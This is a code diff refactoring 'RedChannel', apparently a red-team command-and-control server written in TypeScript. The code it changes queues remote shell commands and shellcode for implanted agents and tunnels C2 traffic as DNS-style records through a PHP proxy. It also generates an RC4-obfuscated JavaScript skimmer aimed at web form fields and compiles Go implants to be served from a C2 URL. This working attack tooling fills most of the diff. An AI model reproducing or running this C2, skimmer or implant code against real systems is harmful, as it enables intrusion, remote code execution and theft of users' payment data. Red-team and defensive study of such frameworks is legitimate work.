@@ -4,12 +4,11 @@ import axios from "axios";
 import * as crypto from "crypto";
 import * as os from "os";
 import * as path from "path";
-import { spawn } from "child_process";
-import RedChannelUI from "./ui";
-import { StringArrayEncoding } from "javascript-obfuscator/typings/src/enums/node-transformers/string-array-transformers/StringArrayEncoding";
+import { spawn, ChildProcessWithoutNullStreams } from "child_process";
 import { emsg } from "../utils/utils";
-import RedChannelCrypto from "./crypto";
+import RedChannelCrypto, { CipherModel } from "./crypto";
 import ECKey from "ec-key";
+import RedChannelLogger from "./logger";
 
 const RC_VERSION = "0.3.0";
 
@@ -44,7 +43,7 @@ export enum AgentCommands {
     AGENT_IGNORE = 0xff,
 }
 
-export interface Agent {
+export interface AgentModel {
     ident: string;
     secret?: Buffer;
     keyx?: ECKey;
@@ -52,7 +51,7 @@ export interface Agent {
     ip?: string;
     channel?: AgentChannel;
     allow_keyx?: boolean;
-    sendq?: any[];
+    sendq?: Array<string[]>;
     recvq?: any;
     ignore?: any;
 }
@@ -67,7 +66,7 @@ class RedChannel {
 
     c2_message_handler: Function;
 
-    agents: { [agentId: string]: Agent };
+    agents: { [agentId: string]: AgentModel };
 
     /**
      * available commands for 'help' to display
@@ -80,7 +79,7 @@ class RedChannel {
     /**
      * holds the agent object we are currently interacting with
      */
-    interact: Agent;
+    interact: AgentModel | null;
 
     /**
      * module actions
@@ -101,15 +100,18 @@ class RedChannel {
     // the absolute path to the app directory
     app_root: string = path.resolve("./");
 
-    ui: RedChannelUI | null = null;
+    log: RedChannelLogger;
 
     crypto: RedChannelCrypto;
 
     constructor(c2_message_handler: Function) {
+        this.log = new RedChannelLogger();
+
         // c2 message handler is called with mock DNS data when fetching from proxy
         // TODO: this is ugly, change it
         this.c2_message_handler = c2_message_handler;
 
+        this.agents = {};
         this.commands = {
             agent: {
                 sysinfo: {
@@ -408,7 +410,7 @@ class RedChannel {
 
         this.crypto = new RedChannelCrypto();
 
-        this.interact = { ident: "" };
+        this.interact = null;
     }
 
     init_agent(agent_id, channel: AgentChannel) {
@@ -447,19 +449,23 @@ class RedChannel {
     }
 
     command_shutdown() {
+        if (!this.interact) return;
         this.queue_data(this.interact.ident, AgentCommands.AGENT_SHUTDOWN, this.aesEncryptedPayload(crypto.randomBytes(6).toString("hex")));
     }
 
     command_shell(shell_cmd) {
+        if (!this.interact) return;
         this.queue_data(this.interact.ident, AgentCommands.AGENT_SHELL, shell_cmd);
     }
 
     command_exec_sc(shellcode) {
+        if (!this.interact) return;
         this.queue_data(this.interact.ident, AgentCommands.AGENT_EXEC_SC, shellcode);
     }
 
     // agent must be able to decrypt the tag to execute shutdown
     command_sysinfo() {
+        if (!this.interact) return;
         this.queue_data(this.interact.ident, AgentCommands.AGENT_SYSINFO, this.aesEncryptedPayload(crypto.randomBytes(6).toString("hex")));
     }
     /**
@@ -469,10 +475,13 @@ class RedChannel {
      * c2_domain=domain1[,domain2?]
      */
     command_set_config(config: string) {
+        if (!this.interact) return;
         this.queue_data(this.interact.ident, AgentCommands.AGENT_SET_CONFIG, config);
     }
 
     aesEncryptedPayload(data: string): string {
+        if (!this.interact) return "";
+
         const buffer = Buffer.from(data);
         const cipher = this.crypto.aes_encrypt(buffer, this.interact.secret);
         const payload = this.make_encrypted_buffer_string(cipher);
@@ -487,60 +496,58 @@ class RedChannel {
      *
      */
     queue_data(agentId, command, data) {
-        let dataPayload = this.aesEncryptedPayload(data);
-
         const agent = this.agents[agentId];
 
+        let dataPayload = this.aesEncryptedPayload(data);
         if (dataPayload.length == 0) dataPayload = crypto.randomBytes(2).toString("hex");
 
-        let data_blocks = dataPayload.match(/[a-f0-9]{1,4}/g);
-
-        if (!data_blocks) return;
-
-        // prettier-ignore
-        var total_records =
-            Math.floor(data_blocks.length / MAX_DATA_BLOCKS_PER_IP) +
-            (data_blocks.length % MAX_DATA_BLOCKS_PER_IP == 0 ? 0 : 1);
+        let dataBlocks = dataPayload.match(/[a-f0-9]{1,4}/g);
+        if (!dataBlocks) return;
 
         // prettier-ignore
-        var totalCommands =
-            Math.floor(total_records / MAX_RECORDS_PER_COMMAND) +
-            (total_records % MAX_RECORDS_PER_COMMAND == 0 ? 0 : 1);
+        const totalRecords =
+            Math.floor(dataBlocks.length / MAX_DATA_BLOCKS_PER_IP) +
+            (dataBlocks.length % MAX_DATA_BLOCKS_PER_IP == 0 ? 0 : 1);
+
+        // prettier-ignore
+        const totalCommands =
+            Math.floor(totalRecords / MAX_RECORDS_PER_COMMAND) +
+            (totalRecords % MAX_RECORDS_PER_COMMAND == 0 ? 0 : 1);
 
         const dataId = crypto.randomBytes(2).toString("hex");
 
         let records: string[] = [];
         // let addedCommands = 1;
-        let padded_bytes = 0;
+        let paddedBytes = 0;
         let record = "";
-        for (let record_num = 0; record_num < total_records; record_num++) {
-            var blocks = data_blocks.splice(0, MAX_DATA_BLOCKS_PER_IP);
+        for (let recordNum = 0; recordNum < totalRecords; recordNum++) {
+            const blocksPerIp = dataBlocks.splice(0, MAX_DATA_BLOCKS_PER_IP);
 
             // pad the last block with trailing Fs
-            var last_added_block = blocks.slice(-1)[0];
-            padded_bytes = 4 - last_added_block.length;
-            blocks[blocks.length - 1] = this.pad_tail(last_added_block, 4);
-            if (blocks.length < MAX_DATA_BLOCKS_PER_IP) {
-                var blocks_needed = MAX_DATA_BLOCKS_PER_IP - blocks.length;
-                for (let j = 0; j < blocks_needed; j++) {
-                    blocks.push(DATA_PAD_CHAR.repeat(4));
-                    padded_bytes += 4;
+            const lastAddedBlock = blocksPerIp.slice(-1)[0];
+            paddedBytes = 4 - lastAddedBlock.length;
+            blocksPerIp[blocksPerIp.length - 1] = this.pad_tail(lastAddedBlock, 4);
+            if (blocksPerIp.length < MAX_DATA_BLOCKS_PER_IP) {
+                const blocksNeeded = MAX_DATA_BLOCKS_PER_IP - blocksPerIp.length;
+                for (let j = 0; j < blocksNeeded; j++) {
+                    blocksPerIp.push(DATA_PAD_CHAR.repeat(4));
+                    paddedBytes += 4;
                 }
             }
-            if (padded_bytes > 0) {
-                padded_bytes = padded_bytes / 2; // agent assumes bytes not hex strings
+            if (paddedBytes > 0) {
+                paddedBytes = paddedBytes / 2; // agent assumes bytes not hex strings
             }
 
             // prettier-ignore
             record =
                 RECORD_DATA_PREFIX +
                 ":" +
-                this.pad_zero(record_num.toString(16), 4) +
+                this.pad_zero(recordNum.toString(16), 4) +
                 ":" +
-                blocks.join(":");
+                blocksPerIp.join(":");
             records.push(record);
 
-            if (totalCommands > 1 && (records.length == MAX_RECORDS_PER_COMMAND - 1 || record_num == total_records - 1)) {
+            if (totalCommands > 1 && (records.length == MAX_RECORDS_PER_COMMAND - 1 || recordNum == totalRecords - 1)) {
                 // prettier-ignore
                 record =
                     RECORD_HEADER_PREFIX +
@@ -548,9 +555,9 @@ class RedChannel {
                     dataId +
                     ":" +
                     this.pad_zero(command.toString(16), 2) +
-                    this.pad_zero(padded_bytes.toString(16), 2) +
+                    this.pad_zero(paddedBytes.toString(16), 2) +
                     ":" +
-                    this.pad_zero(total_records.toString(16), 4) +
+                    this.pad_zero(totalRecords.toString(16), 4) +
                     ":" +
                     "0000:0000:0000:0001";
 
@@ -569,9 +576,9 @@ class RedChannel {
                 dataId +
                 ":" +
                 this.pad_zero(command.toString(16), 2) +
-                this.pad_zero(padded_bytes.toString(16), 2) +
+                this.pad_zero(paddedBytes.toString(16), 2) +
                 ":" +
-                this.pad_zero(total_records.toString(16), 4) +
+                this.pad_zero(totalRecords.toString(16), 4) +
                 ":" +
                 "0000:0000:0000:0001";
             records.unshift(record);
@@ -593,29 +600,32 @@ class RedChannel {
         //console.log("`- records: " + JSON.stringify(records));
     }
 
-    async send_to_proxy(agent_id, records) {
-        var str_records = `${records.join(";")};`;
+    async send_to_proxy(agentId: string, records: string[]) {
+        const recordsString = `${records.join(";")};`;
 
         // console.log("* sending data to proxy: " + str_data);
         const data = {
-            d: str_records,
+            d: recordsString,
             k: this.config.proxy.key,
-            i: agent_id,
+            i: agentId,
             p: "c",
         };
 
-        return await axios
-            .post(this.config.proxy.url, data)
-            .then((res) => this.ui.debug(`proxy send response: ${res.data}`))
-            .catch((e) => this.ui.error(`failed to send data to proxy: ${e.message}`));
+        try {
+            const res = await axios.post(this.config.proxy.url, data);
+            this.log.debug(`proxy send response: ${res.data}`);
+        } catch (ex) {
+            this.log.error(`failed to send data to proxy: ${emsg(ex)}`);
+        }
+        return;
     }
+
     async get_from_proxy() {
         if (!this.config.proxy.enabled) return;
-        if (typeof this.config.proxy.url !== "string" || this.config.proxy.url.length === 0 || typeof this.config.proxy.key !== "string" || this.config.proxy.key.length === 0) return;
+        if (this.config.proxy?.url || this.config.proxy?.key) return;
 
         const data = {
             url: this.config.proxy.url,
-            method: "POST",
             form: {
                 k: this.config.proxy.key,
                 f: "a",
@@ -624,45 +634,46 @@ class RedChannel {
 
         return axios
             .post(this.config.proxy.url, data)
-            .then((res) => {
-                const body = res.data;
-                // we expect the proxy to respond with ERR 1, or similar
-                this.ui.debug(`proxy response:\n${body}`);
-                if (body.length <= 5) throw new Error(`unexpected response (too small)`);
-                if (!VALID_PROXY_DATA.test(body)) throw new Error(`invalid incoming proxy data`);
-
-                // grab proxy response and build mock dns queries
-                let data = body.replace(/;$/, "").split(";");
-                data.forEach((q) => {
-                    let req = {
-                        connection: {
-                            remoteAddress: this.config.proxy.url,
-                            type: "PROXY",
-                        },
-                    };
-                    let res = {
-                        question: [
-                            {
-                                type: "PROXY",
-                                name: `${q}.${this.config.c2.domain}`,
-                            },
-                        ],
-                        answer: [],
-                        end: () => {},
-                    };
-                    this.c2_message_handler(req, res);
-                });
-            })
+            .then((result) => this.process_proxy_data(result.data))
             .catch((e) => {
-                this.ui.error(`proxy fetch failed: ${e.message}`);
+                throw new Error(`proxy fetch failed: ${e.message}`);
             });
     }
 
-    pad_zero(data, max_len) {
-        return "0".repeat(max_len - data.length) + data;
+    process_proxy_data(proxyData: string) {
+        // we expect the proxy to respond with ERR 1, or similar
+        // this.ui.debug(`proxy response:\n${proxyData}`);
+        if (proxyData.length <= 5) throw new Error(`unexpected response (too small)`);
+        if (!VALID_PROXY_DATA.test(proxyData)) throw new Error(`invalid incoming proxy data`);
+
+        // grab proxy response and build mock dns queries
+        let data = proxyData.replace(/;$/, "").split(";");
+        data.forEach((q) => {
+            let req = {
+                connection: {
+                    remoteAddress: this.config.proxy.url,
+                    type: "PROXY",
+                },
+            };
+            let res = {
+                question: [
+                    {
+                        type: "PROXY",
+                        name: `${q}.${this.config.c2.domain}`,
+                    },
+                ],
+                answer: [],
+                end: () => {},
+            };
+            this.c2_message_handler(req, res);
+        });
     }
-    pad_tail(data, max_len) {
-        return data + DATA_PAD_CHAR.repeat(max_len - data.length);
+
+    pad_zero(proxyData, max_len) {
+        return "0".repeat(max_len - proxyData.length) + proxyData;
+    }
+    pad_tail(proxyData, max_len) {
+        return proxyData + DATA_PAD_CHAR.repeat(max_len - proxyData.length);
     }
 
     is_command_in_sendq(agent_id, command) {
@@ -685,23 +696,21 @@ class RedChannel {
     }
 
     /**
-     * Make a string concatting the cipher data and iv
-     * @param {Object} cipher {iv:'', data: ''}
+     * Make a string the cipher data and iv
+     * @param {CipherModel} cipher A cipher object with IV and Data
      * @returns a hex string
      */
-    make_encrypted_buffer_string(cipher) {
+    make_encrypted_buffer_string(cipher: CipherModel) {
         return Buffer.concat([cipher.iv, cipher.data]).toString("hex");
     }
 
-    count_data_chunks(chunks_array) {
+    count_data_chunks(chunks_array: string[]) {
         return chunks_array.filter((a) => a !== undefined).length;
     }
 
     /**
      * return an array of agent idents with an optional
-     * prepended text to each ident
-     *
-     * used mostly in tab completion
+     * prepended text to each ident (for tab completion)
      */
     get_all_agents(prepend = "") {
         const agents: string[] = [];
@@ -711,8 +720,8 @@ class RedChannel {
         return agents;
     }
 
-    get_agent(agent_id): Agent {
-        let agent: Agent = { ident: "" };
+    get_agent(agent_id): AgentModel {
+        let agent: AgentModel = { ident: "" };
         Object.keys(this.agents).forEach((a) => {
             if (a == agent_id) {
                 agent = this.agents[a];
@@ -726,7 +735,7 @@ class RedChannel {
      * skimmer generate action
      */
     skimmer_generate() {
-        if (this.config.skimmer.url.length == 0) return { message: "skimmer url is required, see 'help'", error: true };
+        if (this.config.skimmer.url.length == 0) throw new Error(`skimmer url is required, see 'help'`);
 
         let data: Buffer;
         let skimmerJs = "";
@@ -734,7 +743,7 @@ class RedChannel {
             data = fs.readFileSync("payloads/skimmer.js");
             skimmerJs = data.toString();
         } catch (ex) {
-            return { message: `error: failed to generate payload: ${emsg(ex)}`, error: true };
+            throw new Error(`failed to generate payload: ${emsg(ex)}`);
         }
 
         const targetClasses = "['" + this.config.skimmer.target_classes.join("','") + "']";
@@ -757,24 +766,22 @@ class RedChannel {
                 log: false,
                 renameGlobals: true,
                 stringArray: true,
-                stringArrayEncoding: [StringArrayEncoding.Rc4],
+                stringArrayEncoding: ["rc4"],
                 identifierNamesGenerator: "mangled",
             });
             this.modules.skimmer.payload = obfs.getObfuscatedCode();
         } catch (ex) {
-            return { message: `error: failed to obfuscate js payload: ${emsg(ex)}`, error: true };
+            throw new Error(`failed to obfuscate js payload: ${emsg(ex)}`);
         }
 
-        return {
-            message: `skimmer payload set: \n${this.modules.skimmer.payload}`,
-            error: false,
-        };
+        return { message: `skimmer payload set to: \n${this.modules.skimmer.payload}` };
     }
+
     /**
      * proxy generate action
      */
     proxy_generate() {
-        if (this.config.proxy.key.length == 0) return { message: "proxy key is required, see 'help'", error: true };
+        if (!this.config.proxy.key) throw new Error(`proxy key is required, see 'help'`);
 
         let data: Buffer;
         let proxyPhp = "";
@@ -782,7 +789,7 @@ class RedChannel {
             data = fs.readFileSync("payloads/proxy.php");
             proxyPhp = data.toString();
         } catch (ex) {
-            return { message: `error: failed to generate payload: ${emsg(ex)}`, error: true };
+            throw new Error(`failed to generate payload: ${emsg(ex)}`);
         }
 
         proxyPhp = proxyPhp.replace(/\[PROXY_KEY\]/, this.config.proxy.key);
@@ -793,14 +800,11 @@ class RedChannel {
         proxyPhp = proxyPhp.replace(/\s{2,}/g, "");
 
         this.modules.proxy.payload = `<?php ${proxyPhp} ?>`;
-        return {
-            message: `proxy payload set: \n${this.modules.proxy.payload}`,
-            error: false,
-        };
+        return { message: `proxy payload set: \n${this.modules.proxy.payload}` };
     }
     proxy_fetch() {
         this.get_from_proxy();
-        return { message: "fetching data from proxy...", error: false };
+        return { message: "fetching data from proxy..." };
     }
 
     proxy_enable() {
@@ -825,30 +829,26 @@ class RedChannel {
     }
 
     static_dns_add(params) {
-        if (params.length < 2) return { message: "please enter a host and ip, see 'help'", error: true };
+        if (params.length < 2) throw new Error(`please enter a host and ip, see 'help'"`);
 
         let host = params[0];
         let ip = params[1];
 
-        if (!VALID_HOST_REGEX.test(host)) return { message: "invalid host value, see 'help'", error: true };
-        if (!VALID_IP_REGEX.test(ip)) return { message: "invalid ip value, see 'help'", error: true };
+        if (!VALID_HOST_REGEX.test(host)) throw new Error(`invalid host value, see 'help'`);
+        if (!VALID_IP_REGEX.test(ip)) throw new Error(`invalid ip value, see 'help'`);
 
         this.config.static_dns[host] = ip;
-        return { message: "added static dns record", error: false };
+        return { message: `added static dns record ${host} = ${ip}` };
     }
-    static_dns_delete(params) {
-        if (params.length == 0) {
-            return {
-                message: "please enter a host, see 'help'",
-                error: true,
-            };
-        }
 
-        var host = params[0];
-        if (!VALID_HOST_REGEX.test(host)) return { message: "invalid host value, see 'help'", error: true };
+    static_dns_delete(params) {
+        if (params.length == 0) throw new Error(`please enter a host, see 'help'"`);
+
+        const host = params[0];
+        if (!VALID_HOST_REGEX.test(host)) throw new Error(`invalid host value, see 'help'`);
 
         delete this.config.static_dns[host];
-        return { message: "deleted static dns record", error: false };
+        return { message: `deleted static dns record ${host}` };
     }
 
     implant_build_gen_config() {
@@ -875,83 +875,74 @@ class RedChannel {
         } catch (ex) {
             throw new Error(`failed to write agent config file '${agentConfigPath}': ${emsg(ex)}`);
         }
-        return {
-            message: `agent config file written to: ${agentConfigPath}`,
-            error: false,
-        };
+        return { message: `agent config file written to: ${agentConfigPath}` };
     }
-    implant_build(params) {
-        var implant_os = this.config.implant.os;
-        var arch = this.config.implant.arch;
-        var debug = this.config.implant.debug;
 
-        if (typeof params[0] !== "undefined") {
-            implant_os = params[0];
-        }
-        if (typeof params[0] !== "undefined") {
-            arch = params[1];
-        }
-        if (!VALID_BUILD_TARGET_OS.test(implant_os)) return { message: "invalid os value, must be supported by Go (GOOS)", error: true };
-        if (!VALID_BUILD_TARGET_ARCH.test(arch)) return { message: "invalid arch value, must be supported by Go (GOARCH)", error: true };
+    implant_build(params) {
+        const targetOs = params[0] ?? this.config.implant.os;
+        const targetArch = params[1] ?? this.config.implant.arch;
+        const debug = this.config.implant.debug;
+
+        if (!VALID_BUILD_TARGET_OS.test(targetOs)) throw new Error(`invalid os value, must be supported by Go (GOOS)`);
+        if (!VALID_BUILD_TARGET_ARCH.test(targetArch)) throw new Error(`invalid arch value, must be supported by Go (GOARCH)`);
 
         try {
             this.implant_build_gen_config();
         } catch (ex) {
-            return { message: emsg(ex), error: true };
+            throw new Error(`error generating build config: ${emsg(ex)}`);
         }
 
-        var root_folder = this.app_root;
-
-        var build_path = `${root_folder}/agent`;
-        var output_file = `${build_path}/build/agent${implant_os === "windows" ? ".exe" : ""}`;
-        var binary = "python";
+        const buildPath = `${this.app_root}/agent`;
+        const outputFile = `${buildPath}/build/agent${targetOs === "windows" ? ".exe" : ""}`;
 
         // prettier-ignore
-        var command_args = [
-            `${build_path}/tools/build.py`,
-            `${build_path}`,
-            `${output_file}`,
-            implant_os,
-            arch,
+        const commandArguments = [
+            `${buildPath}/tools/build.py`,
+            `${buildPath}`,
+            `${outputFile}`,
+            targetOs,
+            targetArch,
             debug && "debug",
         ];
-        var env_variables = {
-            GOOS: implant_os,
-            GOARCH: arch,
+        const goEnvironment = {
+            GOOS: targetOs,
+            GOARCH: targetArch,
             GO111MODULE: "auto",
             GOCACHE: path.join(os.tmpdir(), "rc-build-cache"), // 'go cache clean' after build?
             GOPATH: path.join(os.tmpdir(), "rc-build-path"),
             PATH: process.env.PATH,
         };
 
+        const spawnBinary = "python";
+        let childProcess: ChildProcessWithoutNullStreams;
         try {
             // TODO: do this with docker instead? https://hub.docker.com/_/golang
-            var child = spawn(binary, command_args, {
-                env: env_variables,
-                cwd: build_path /*, windowsVerbatimArguments: true*/,
+            childProcess = spawn(spawnBinary, commandArguments, {
+                env: goEnvironment,
+                cwd: buildPath /*, windowsVerbatimArguments: true*/,
             });
-            child.on("close", (code) => {
+            childProcess.on("close", (code) => {
                 // send this message to the UI somehow
-                this.ui.success(`agent build for os: ${implant_os}, arch: ${arch}, debug: ${debug ? "true" : "false"}, return code: ${code}`);
+                this.log.success(`agent build for os: ${targetOs}, arch: ${targetArch}, debug: ${debug ? "true" : "false"}, return code: ${code}`);
             });
         } catch (ex) {
-            return { message: `failed to launch build command: '${emsg(ex)}', build command: '${binary} ${command_args.join(" ")}'`, error: true };
+            return { message: `failed to launch build command: '${emsg(ex)}', build command: '${spawnBinary} ${commandArguments.join(" ")}'`, error: true };
         }
 
         try {
-            var log_stream = fs.createWriteStream(`${root_folder}/agent/build/build.log`, { flags: "w" });
-            child.stdout.pipe(log_stream);
-            child.stderr.pipe(log_stream);
+            const logStream = fs.createWriteStream(`${this.app_root}/agent/build/build.log`, { flags: "w" });
+            childProcess.stdout.pipe(logStream);
+            childProcess.stderr.pipe(logStream);
         } catch (ex) {
-            return { message: `failed to write log file: ${emsg(ex)}`, error: true };
+            throw new Error(`failed to write log file: ${emsg(ex)}`);
         }
 
-        this.config.implant.output_file = output_file;
-        var binary_url = this.config.c2.web_url + this.config.c2.binary_route;
+        this.config.implant.output_file = outputFile;
+
+        const binaryUrl = this.config.c2.web_url + this.config.c2.binary_route;
 
         return {
-            message: `building ${debug ? "(debug)" : ""} agent for os: ${implant_os}, arch: ${arch}, binary will be available here: ${output_file} and ${binary_url}`,
-            error: false,
+            message: `building ${debug ? "(debug)" : ""} agent for os: ${targetOs}, arch: ${targetArch}, binary will be available here: ${outputFile} and ${binaryUrl}`,
         };
     }
     implant_log() {
